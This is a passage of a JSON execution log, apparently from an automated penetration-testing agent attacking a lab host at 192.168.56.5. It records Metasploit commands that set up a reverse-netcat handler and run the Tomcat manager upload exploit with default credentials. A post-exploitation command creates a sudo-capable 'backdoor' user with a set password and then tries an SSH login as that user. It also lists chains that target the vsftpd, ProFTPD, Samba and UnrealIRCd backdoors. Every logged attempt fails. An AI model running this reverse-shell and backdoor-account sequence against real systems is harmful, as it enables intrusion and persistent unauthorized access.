+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set LPORT 4447",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/http/tomcat_mgr_upload) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/http/tomcat_mgr_upload) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/http/tomcat_mgr_upload) > exploit -j\n[-] Exploit failed: cmd/unix/reverse_netcat is not a compatible payload.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/http/tomcat_mgr_upload) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/http/tomcat_mgr_upload) > exploit -j\n[-] Exploit failed: cmd/unix/reverse_netcat is not a compatible payload.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/http/tomcat_mgr_upload) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                }
+            ],
+            "post_exploitation": [
+                {
+                    "description": "Escalate using shell and create persistent backdoor user, verify SSH access",
+                    "command": "sessions -i 1 -c 'sudo -S sh -c \"useradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd\" < /dev/null'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/http/tomcat_mgr_upload) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/http/tomcat_mgr_upload) > exploit -j\n[-] Exploit failed: cmd/unix/reverse_netcat is not a compatible payload.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/http/tomcat_mgr_upload) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(multi/http/tomcat_mgr_upload) > sessions -i 1 -c 'sudo -S sh -c \"use\nradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd\" <\n/dev/null'\n[-] Invalid session identifier: 1\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Escalate using shell and create persistent backdoor user, verify SSH access",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'tomcat_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Escalate using shell and create persistent backdoor user, verify SSH access",
+                    "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        }
+    },
+    "failed_chains": [],
+    "initial_chains": [
+        "Chain 1: Vsftpd Backdoor Root Access",
+        "Chain 2: ProFTPD Backdoor Root Access",
+        "Chain 3: Samba Usermap Script RCE",
+        "Chain 4: UnrealIRCd Backdoor RCE",
+        "Chain 5: Tomcat Manager Upload RCE"
+    ],
+    "privilege_chains": [],
+    "persistence_chains": []
+}
